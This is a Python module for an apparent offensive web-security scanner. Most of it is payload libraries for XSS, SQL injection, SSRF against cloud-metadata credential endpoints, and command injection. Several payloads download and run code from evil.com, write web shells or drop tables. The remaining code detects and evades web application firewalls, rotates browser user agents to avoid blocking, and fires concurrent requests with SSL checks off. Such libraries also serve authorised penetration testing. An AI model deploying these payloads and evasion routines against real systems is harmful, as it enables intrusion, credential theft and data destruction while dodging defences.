"""
Shared constants and state for AppSec tools.
UPGRADED: Expanded payload libraries for offensive security testing.
"""

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 15

# ═══════════════════════════════════════════════════════════════════════════
# XSS PAYLOADS - Expanded with context-aware and WAF bypass techniques
# ═══════════════════════════════════════════════════════════════════════════

# Basic XSS payloads (backward compatibility)
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
]

# Advanced XSS payloads by context
XSS_PAYLOADS_ADVANCED = {
    "html_context": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<object data=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>',
    ],
    "attribute_context": [
        '" onfocus=alert(1) autofocus "',
        "' onfocus=alert(1) autofocus '",
        '" onmouseover=alert(1) "',
        "'-alert(1)-'",
        '" onclick=alert(1) "',
        '" onload=alert(1) "',
        '" onerror=alert(1) "',
        "' onanimationstart=alert(1) '",
        '" ontransitionend=alert(1) "',
    ],
    "script_context": [
        "'-alert(1)-'",
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
        "${alert(1)}",
        "`;alert(1)//",
        "'-alert(String.fromCharCode(88,83,83))-'",
        "\\x27-alert(1)-\\x27",
    ],
    "url_context": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
        "javascript:eval(atob('YWxlcnQoMSk='))",
    ],
    "csp_bypass": [
        '<script src=https://cdn.jsdelivr.net/gh/user/repo@main/xss.js></script>',
        '<link rel=import href=data:text/html,<script>alert(1)</script>>',
        '<object data=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>',
        '<script src=//evil.com></script>',
        '<script>import("data:text/javascript,alert(1)")</script>',
        '<script nonce=random>alert(1)</script>',
    ],
    "dom_xss_sinks": [
        "#<script>alert(1)</script>",
        "?q=<script>alert(1)</script>",
        "?redirect=javascript:alert(1)",
        "?url=javascript:alert(1)",
        "?next=javascript:alert(1)",
        "?return=javascript:alert(1)",
    ],
    "waf_bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script/src=data:,alert(1)>",
        "<script>alert(1)//</script>",
        "<<script>alert(1)//<<script>",
        "<script x>alert(1)</script>",
        "<script>alert(1)</script x>",
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        '<img src=x onerror="alert`1`">',
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><animate onbegin=alert(1)>",
        "<input type=image src=x onerror=alert(1)>",
        "<isindex type=image src=x onerror=alert(1)>",
        "<form><button formaction=javascript:alert(1)>",
        "<img src=`x`onerror=alert(1)>",
        "<!--<img src=--><img src=x onerror=alert(1)//>",
    ],
    "polyglot": [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
        '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>">\'><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">',
    ],
}

# ═══════════════════════════════════════════════════════════════════════════
# SQLI PAYLOADS - Expanded with DBMS-specific and WAF bypass techniques
# ═══════════════════════════════════════════════════════════════════════════

# Basic SQLi payloads (backward compatibility)
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' AND SLEEP(5)--",
]

# Advanced SQLi payloads by technique and DBMS
SQLI_PAYLOADS_ADVANCED = {
    "error_based": [
        "' OR 1=1--",
        "' OR 'x'='x",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",  # MySQL
        "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",  # MSSQL
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",  # Oracle
        "' AND 1=CAST((SELECT version()) AS INT)--",  # PostgreSQL
    ],
    "time_based": [
        "' AND SLEEP(5)--",  # MySQL
        "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
        "' AND pg_sleep(5)--",  # PostgreSQL
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL bypass
        "' OR BENCHMARK(5000000,SHA1('test'))--",  # MySQL alternative
        "' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",  # Oracle
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",  # PostgreSQL conditional
        "' AND IF(1=1,SLEEP(5),0)--",  # MySQL conditional
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",  # MSSQL conditional
    ],
    "order_by_injection": [
        "1 ORDER BY 1--",
        "1 ORDER BY 10000--",
        "name ASC,(SELECT 1 FROM (SELECT SLEEP(5))x)--",
        "(CASE WHEN 1=1 THEN name ELSE id END)",
        "1,IF(1=1,SLEEP(5),0)--",
        "1 GROUP BY 1--",
    ],
    "union_extraction": [
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users--",
        "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
        "' UNION SELECT database(),user()--",
        "' UNION SELECT @@version,@@datadir--",
        "' UNION SELECT load_file('/etc/passwd'),NULL--",  # MySQL file read
        "' UNION SELECT NULL,NULL INTO OUTFILE '/tmp/shell.php'--",  # MySQL file write
    ],
    "boolean_blind": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(version(),1,1)='5'--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
    ],
    "waf_bypass": [
        "' /*!50000OR*/ 1=1--",  # MySQL version comment
        "' /*!OR*/+/*!OR*/ 1=1--",  # Double comment
        "' O/**/R 1=1--",  # Inline comment
        "' %4F%52 1=1--",  # URL encoded
        "' OR%0A1=1--",  # Newline bypass
        "'+OR+'1'='1",  # Quote variation
        "' OR 1=1 LIMIT 1 OFFSET 0--",  # LIMIT bypass
        "' OR 1 GROUP BY CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2)) HAVING MIN(0)--",  # Double query
        "' OR 1=1#",  # Hash comment
        "' OR 1=1;%00",  # Null byte
        "' OR 1=1 AND '1'='1",  # AND bypass
        "' UNION/*!50000SELECT*/1,2,3--",  # Version comment in UNION
        "' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--",  # Invalid version comment
        "' UnIoN SeLeCt 1,2,3--",  # Case variation
        "' OR 'x'='x",  # Alternative OR
        "' OR 'a'='a",  # Alternative OR
        "' OR ''='",  # Empty string
        "' OR 1-- -",  # Double dash with space
        "' OR 1#",  # Hash comment
        "' OR 1/*",  # Comment start
    ],
    "stacked_queries": [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; EXEC xp_cmdshell('whoami')--",  # MSSQL
        "'; SELECT INTO OUTFILE '/var/www/html/shell.php'--",  # MySQL
    ],
    "second_order": [
        "admin'-- ",  # Stored and executed later
        "' OR 1=1-- ",  # Stored in DB, executed in another query
        "'; WAITFOR DELAY '0:0:5'-- ",  # Time-based second order
    ],
}

# ═══════════════════════════════════════════════════════════════════════════
# SSRF PAYLOADS - Expanded with protocol smuggling and cloud metadata
# ═══════════════════════════════════════════════════════════════════════════

# Basic SSRF payloads (backward compatibility)
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
]

# Advanced SSRF payloads by technique
SSRF_PAYLOADS_ADVANCED = {
    "localhost_bypass": [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.1",
        "http://127.0.1",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        "http://2130706433",  # Decimal IP
        "http://0x7f000001",  # Hex IP
        "http://0177.0.0.1",  # Octal IP
        "http://[::1]",  # IPv6 localhost
        "http://[0:0:0:0:0:ffff:127.0.0.1]",  # IPv6 mapped
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.name",
        "http://127.0.0.1.sslip.io",
        "http://0",  # Shorthand localhost
        "http://0.0.0.0",
        "http://[::ffff:127.0.0.1]",
        "http://①②⑦.⓪.⓪.①",  # Unicode bypass
        "http://127.000.000.1",  # Zero padding
        "https://evil.com@169.254.169.254/latest/meta-data/",
        "http://169.254.169.254#@evil.com",
        "http://evil.com\\.169.254.169.254",
        "http://169.254.169.254%0a.evil.com",
        "http://1.1.1.1 &@2.2.2.2# @3.3.3.3/",
    ],
    "cloud_metadata": {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
            "http://metadata/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/user-data",
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/region",
        ],
        "oracle": [
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v1/instance/metadata/",
        ],
    },
    "protocol_smuggling": [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///proc/self/cwd",
        "file:///proc/self/fd/0",
        "file:///c:/windows/win.ini",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "dict://127.0.0.1:6379/INFO",
        "dict://127.0.0.1:6379/CONFIG GET *",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
        "gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3Aattacker%40evil.com%0d%0a",
        "gopher://127.0.0.1:11211/_stats%0d%0aquit%0d%0a",  # Memcached
        "ldap://localhost:389/cn=test",
        "tftp://localhost:69/test",
        "sftp://localhost:22/etc/passwd",
    ],
    "internal_services": [
        "http://127.0.0.1:22",  # SSH
        "http://127.0.0.1:21",  # FTP
        "http://127.0.0.1:25",  # SMTP
        "http://127.0.0.1:3306",  # MySQL
        "http://127.0.0.1:5432",  # PostgreSQL
        "http://127.0.0.1:6379",  # Redis
        "http://127.0.0.1:27017",  # MongoDB
        "http://127.0.0.1:9200",  # Elasticsearch
        "http://127.0.0.1:11211",  # Memcached
        "http://127.0.0.1:5672",  # RabbitMQ
        "http://127.0.0.1:9042",  # Cassandra
        "http://127.0.0.1:2379",  # etcd
        "http://127.0.0.1:8500",  # Consul
        "http://127.0.0.1:4369",  # Erlang Port Mapper
        "http://127.0.0.1:9000",  # PHP-FPM
        "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
        "http://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets",
    ],
    "dns_rebinding": [
        "http://spoofed.burpcollaborator.net",
        "http://1ynrnhl.xip.io",  # Resolves to 1.121.114.110.108
        "http://make-127-0-0-1-rr.1u.ms",  # DNS rebinding service
    ],
}

# ═══════════════════════════════════════════════════════════════════════════
# COMMAND INJECTION PAYLOADS - Expanded with encoding and OS-specific bypasses
# ═══════════════════════════════════════════════════════════════════════════

CMDI_PAYLOADS_ADVANCED = {
    "linux_basic": [
        ";id",
        "|id",
        "||id",
        "&id",
        "&&id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        "$(whoami)",
        ";cat /etc/passwd",
        "|cat /etc/passwd",
    ],
    "linux_bypass": [
        # IFS bypass
        "cat${IFS}/etc/passwd",
        "cat$IFS/etc/passwd",
        "cat$u/etc/passwd",
        "cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",
        # Wildcard bypass
        "/???/??t /???/p??s??",
        "/???/n? -e /???/b??? 127.0.0.1 4444",
        # Encoding bypass
        "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
        "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
        "$'cat\\x20/etc/passwd'",
        # Quote bypass
        "c'a't /etc/passwd",
        'c"a"t /etc/passwd',
        "ca\\t /etc/passwd",
        # Newline bypass
        "cat%0a/etc/passwd",
        "cat%0d%0a/etc/passwd",
        # Comment bypass
        "cat /etc/passwd #",
        "cat /etc/passwd /*",
        # Brace expansion
        "{cat,/etc/passwd}",
        # Variable expansion
        "cat /e$@tc/pa$@sswd",
    ],
    "windows_basic": [
        "&whoami",
        "&&whoami",
        "|whoami",
        "||whoami",
        ";whoami",
        "&ipconfig",
        "|ipconfig",
    ],
    "windows_bypass": [
        # Environment variable bypass
        "cmd /c echo %COMSPEC%",
        "c^m^d /c whoami",
        'c"m"d /c whoami',
        # PowerShell bypass
        "powershell -enc dwBoAG8AYQBtAGkA",
        "powershell -w hidden -c whoami",
        "powershell -c IEX(New-Object Net.WebClient).downloadString('http://evil.com/shell.ps1')",
        # WMIC bypass
        'wmic process call create "cmd.exe /c whoami"',
        # Certutil bypass
        "certutil -urlcache -f http://evil.com/shell.exe shell.exe && shell.exe",
        # Mshta bypass
        "mshta http://evil.com/shell.hta",
        # Regsvr32 bypass
        "regsvr32 /s /n /u /i:http://evil.com/shell.sct scrobj.dll",
        # Forfiles bypass
        'forfiles /p c:\\windows\\system32 /m cmd.exe /c "cmd /c whoami"',
    ],
    "polyglot": [
        ";{cat,/etc/passwd};",
        "|{cat,/etc/passwd}|",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        ";$(cat /etc/passwd);",
        "|$(cat /etc/passwd)|",
        "test;id;test",
        "test|id|test",
        "test`id`test",
        "test$(id)test",
    ],
}

# Path traversal payloads (unchanged)
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

# Per-session host deduplication for full_appsec_scan
_appsec_scanned_hosts: set[str] = set()


# ═══════════════════════════════════════════════════════════════════════════
# WAF-Aware Scanner Middleware
# Connects the http_evasion.py engine (WAF detection + bypass transforms)
# to all appsec scanners automatically.
# ═══════════════════════════════════════════════════════════════════════════

import urllib.parse as _urlparse

# Per-host WAF fingerprint cache (avoids re-probing on every scan call)
_waf_cache: dict[str, tuple[str, float]] = {}  # host → (vendor, confidence)


def _detect_waf(url: str) -> tuple[str, float]:
    """Detect WAF for the given URL, cached per-host.
    
    Returns:
        (vendor: str, confidence: float) — e.g. ("Cloudflare", 0.8)
    """
    try:
        parsed = _urlparse.urlparse(url)
        host = parsed.netloc or parsed.hostname or ""
        
        if host in _waf_cache:
            return _waf_cache[host]
        
        from src.tools.http_evasion import _waf_detector
        vendor, confidence, _sigs = _waf_detector.fetch_and_fingerprint(url)
        _waf_cache[host] = (vendor, confidence)
        return (vendor, confidence)
    except Exception:
        return ("unknown", 0.0)


def _waf_transform_payloads(
    payloads: list,
    attack_type: str,
    url: str = "",
    waf_vendor: str = "",
    max_variants: int = 3,
) -> list:
    """Generate WAF-bypass variants of payloads.
    
    If waf_vendor is not provided, auto-detects from url.
    Returns the ORIGINAL payloads + transformed variants (deduped).
    
    Args:
        payloads: List of raw payload strings
        attack_type: "sqli", "xss", "lfi", "rce", "ssrf", "ssti", "xxe"
        url: Target URL (used for WAF auto-detection if waf_vendor is empty)
        waf_vendor: Override WAF vendor name (skip auto-detection)
        max_variants: Max bypass variants per payload (keep scan fast)
    
    Returns:
        Extended payload list with bypass variants appended
    """
    try:
        from src.tools.http_evasion import get_bypass_strategies, apply_bypass_transform
    except ImportError:
        return payloads  # Graceful degradation if evasion module unavailable
    
    if not waf_vendor and url:
        waf_vendor, confidence = _detect_waf(url)
        if confidence < 0.2:
            return payloads  # No WAF detected, send raw payloads
    
    if not waf_vendor or waf_vendor == "unknown":
        waf_vendor = "generic"
    
    strategies = get_bypass_strategies(waf_vendor, attack_type)
    if not strategies:
        return payloads
    
    # Build extended list: original + bypass variants
    extended = list(payloads)
    seen = set(payloads)
    
    for payload in payloads:
        variants_added = 0
        for technique in strategies:
            if variants_added >= max_variants:
                break
            try:
                transformed = apply_bypass_transform(payload, technique)
                if transformed and transformed != payload and transformed not in seen:
                    extended.append(transformed)
                    seen.add(transformed)
                    variants_added += 1
            except Exception:
                continue
    
    return extended


def _get_evasion_headers(custom_headers: dict[str, str] | None = None) -> dict[str, str]:
    """Get realistic browser headers with UA rotation.
    
    Replaces the static CyberCoPilot/1.0 User-Agent with rotating
    real browser UAs to avoid WAF fingerprint-based blocking.
    
    Returns:
        Dict of HTTP headers suitable for requests or curl
    """
    try:
        from src.tools.http_evasion import get_evasion
        evasion = get_evasion()
        headers = evasion.get_headers(custom_headers)
        return headers
    except ImportError:
        # Fallback to static headers with a realistic UA
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if custom_headers:
            headers.update(custom_headers)
        return headers


async def register_appsec_vulnerability(**kwargs) -> bool:
    """Register a scanner finding when the vulnerability DB is available."""
    try:
        from src.tools.vuln_db import register_vulnerability
    except ImportError:
        return False

    await register_vulnerability.invoke(**kwargs)
    return True


__all__ = [
    '_DEFAULT_HEADERS', '_TIMEOUT',
    'XSS_PAYLOADS', 'XSS_PAYLOADS_ADVANCED',
    'SQLI_PAYLOADS', 'SQLI_PAYLOADS_ADVANCED',
    'SSRF_PAYLOADS', 'SSRF_PAYLOADS_ADVANCED',
    'CMDI_PAYLOADS_ADVANCED',
    'PATH_TRAVERSAL_PAYLOADS',
    '_appsec_scanned_hosts',
    '_waf_transform_payloads', '_get_evasion_headers', '_detect_waf',
    'register_appsec_vulnerability',
    '_waf_cache',
    'async_fetch_all'
]

import asyncio
try:
    import aiohttp
except ImportError:
    aiohttp = None

async def async_fetch_all(urls_or_requests, max_concurrent=50, timeout_sec=15) -> list:
    """
    Asynchronously fires a list of HTTP requests using aiohttp.
    
    Args:
        urls_or_requests: List of URLs (strings) or Dicts {"method": "POST", "url": "...", "data": {...}, "headers": {...}}
        max_concurrent: Maximum number of concurrent connections
        timeout_sec: Timeout in seconds per request
        
    Returns:
        List of dicts: [{"status": 200, "text": "...", "elapsed": 0.5, "req": original_req}, ...]
    """
    if aiohttp is None:
        raise ImportError("aiohttp is required for the async scanner engine. Run: pip install aiohttp")
    assert aiohttp is not None
        
    semaphore = asyncio.Semaphore(max_concurrent)
    timeout = aiohttp.ClientTimeout(total=timeout_sec)
    
    async def fetch(session, req, index):
        async with semaphore:
            start = asyncio.get_event_loop().time()
            method = "GET"
            url = req
            kwargs = {}
            
            if isinstance(req, dict):
                method = req.get("method", "GET")
                url = req.get("url")
                if "data" in req: kwargs["data"] = req["data"]
                if "headers" in req: kwargs["headers"] = req["headers"]
                if "cookies" in req: kwargs["cookies"] = req["cookies"]
                
            try:
                async with session.request(method, url, **kwargs) as response:
                    text = await response.text()
                    elapsed = asyncio.get_event_loop().time() - start
                    return {"index": index, "status": response.status, "text": text, "elapsed": elapsed, "req": req, "error": None}
            except Exception as e:
                elapsed = asyncio.get_event_loop().time() - start
                return {"index": index, "status": 0, "text": "", "elapsed": elapsed, "req": req, "error": str(e)}

    # Use a custom connector to ignore SSL errors and speed up connection pooling
    connector = aiohttp.TCPConnector(ssl=False, limit=max_concurrent)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [fetch(session, req, i) for i, req in enumerate(urls_or_requests)]
        results = await asyncio.gather(*tasks)
        
    # Sort results to match original request order
    results.sort(key=lambda x: x["index"])
    return results
